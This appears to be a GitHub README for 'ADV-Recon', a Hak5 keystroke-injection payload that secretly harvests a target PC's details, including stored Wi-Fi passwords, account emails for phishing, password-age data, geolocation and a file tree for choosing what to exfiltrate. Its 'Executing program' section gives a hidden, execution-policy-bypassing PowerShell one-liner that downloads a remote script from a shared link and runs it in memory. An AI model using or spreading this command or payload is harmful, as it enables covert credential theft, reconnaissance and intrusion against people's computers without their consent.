![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 

<h1 align="center">
  <a href="https://git.io/typing-svg">
    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+the;Adv+Recon+Payload!+😈&center=true&size=30">
  </a>
</h1>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# ADV-Recon

A script used to do an advanced level of Recon on the targets computer

## Description

This program enumerates a target PC to collect as much recon data as possible for future engagements
This includes: 
* Hosts Powershell Version (to know what commands can be run)
* Name Associated with their Microsoft Account (Or ENV UserName variable if one is not detected)
* Whether they are in the Admin group or not 
* The email associated with their Microsoft Account (for phishing possibilities)
* Other User accounts on their system (for possible privledge escalation)
* Details on their login settings (Ex: Min/Max password age and length)
* How many days since they have changed their password (Max password age - Days since = Opportunity)
* Their GeoLocation (know their approximate where abouts)
* Nearby Wifi Networks (Possible lateral movement)
* Network Info (Local and Public IP Address; MAC Address; RDP Enabled?)
* WLAN Profiles (List of SSIDs and Passwords stored on their PC)
* Network Interfaces (What are they connecting in and out with)
* System Information (Manufacturer, Model, Serial Number, OS, CPU, RAM, Mainboard BIOS)
* Local Users (Accounts on system with Username, name associated with microsoft account and SID)
* Information on their HardDrives (Indicator of Recon Scope)
* COM and Serial Devices (Is there a device connected you can manipulate?)
* Active TCP Connections (Poor mans Port Scanning)
* Processes, Services, Software, and Drivers (What is running on the computer we can exploit?)
* Video Card info (how much vroom vroom?)
* Tree Command (Gain a more accurate assessment of what to exfil or use in Phishing attacks)

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release
* 0.5
    * Added additional recon capabilities

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>

<p align="center">
        <img src="https://raw.githubusercontent.com/bornmay/bornmay/Update/svg/Bottom.svg" alt="Github Stats" />
</p>
